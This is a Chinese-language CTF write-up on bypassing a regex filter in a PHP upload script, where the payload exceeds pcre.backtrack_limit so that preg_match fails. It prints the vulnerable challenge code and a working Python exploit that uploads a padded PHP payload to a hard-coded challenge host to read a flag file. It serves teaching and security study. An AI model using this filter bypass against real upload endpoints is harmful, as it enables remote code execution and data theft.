# 正则回溯引发的安全问题

### 一.	CTF题目

```php
<?php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
}
```

  代码逻辑很简单：通过正则匹配"\<? ... ?>"若匹配成功则判断为php代码返回"bad request"，失败则通过真实IP的MD5值创建目录，写入到一个文件名为随机数字的php文件里，最后跳转到该地址。

### 二.	解题思路

  思路有两种：1.绕过正则匹配；2.寻找preg_match函数本身的问题/漏洞

* 思路1：首先我们要了解一下php的标签有几种
   * 常规的是"\<?php ?>"

   * 短标签"\<? ?>"，需要在php.ini中开启short_open_tag

   * asp标签"<% %>"、"<%= %>"，需要在php.ini中开启asp_tags

   * "\<?= ?>"，php5.4以后总是可用不受short_open_tag影响

   * <script language="php"> </script>
      根据官方文档可知"<% %>"、"<%= %>"以及<script language="php"> </script>在php7中被移除
       ![image](php_tag.png)
       所以，如果是php5下可用<script language="php"> </script>绕过该正则，但题目环境是php7，所以我们需要寻找preg_match本身的问题

* 思路2：
  查看官方文档可以找到这样一个条目preg_last_error —— 返回最近一次正则执行的错误代码，其中有这样一个错误PREG_BACKTRACK_LIMIT_ERROR，当正则回溯超过pcre.backtrack_limit时引发该错误。
  ![image](backtrack_limit.png)
  当产生这个错误时函数的返回值为FALSE也就绕过了is_php()。


### 三.	正则回溯的机制
  PHP采用的正则库是PCRE(Perl Compatible Regular Expressions)，PCRE的正则引擎为NFA。正则引擎分为两种：NFA(nondeterministic finite automaton/非确定有限状态自动机)和DFA(deterministic finite automaton/确定有限状态自动机)。NFA在匹配时是以正则为主导，吃入字符进行匹配，若匹配不上则吐出一个字符进行回溯，对于多个正则式匹配最左子正则。例如：对于正则："god|goddess" 文本："goddess" NFA匹配到"god"时成功匹配到第一个子正则就会返回不会继续匹配下一个子正则"goddess"，所以最终的结果就是"god"。
回到题目：
```php
function is_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}
```

该正则对于文本"\<?php echo 1;?>/*padding"的匹配过程如下：

* "<\\?"匹配"<?"

* ".*"匹配"php echo 1;>/\*padding"

* "[(`;?>]"匹配失败，吐出结尾的一个字符"g"，回溯次数加一

* "[(`;?>]"匹配再次失败，吐出结尾的一个字符"n"，回溯次数加一

* ...

* 直到把"/*padding"全部吐出，"[(`;?>]"匹配到"?>"

* 最后".*"匹配"padding"，完成匹配


也就是说在这种情况下回溯次数等于结尾填充的字符串长度，当字符串长度超过pcre.backtrack_limit也就是1000000时，函数产生错误PREG_BACKTRACK_LIMIT_ERROR，返回FALSE，也就绕过了安全检查。

另外题目中还限制了命令执行函数，所以需要通过scandir()找到flag文件，用file_get_contents读取，所以最终payload如下：

```python
import requests

if __name__ == '__main__':
    response = requests.post('http://51.158.75.42:8088/',
                             files={'file': '<?php var_dump(file_get_contents("/var/www/flag_php7_2_1s_c0rrect"));/*' + 'a' * 1000000},
                             allow_redirects=False)
    print(response.headers)

```
 ![image](flag.png)

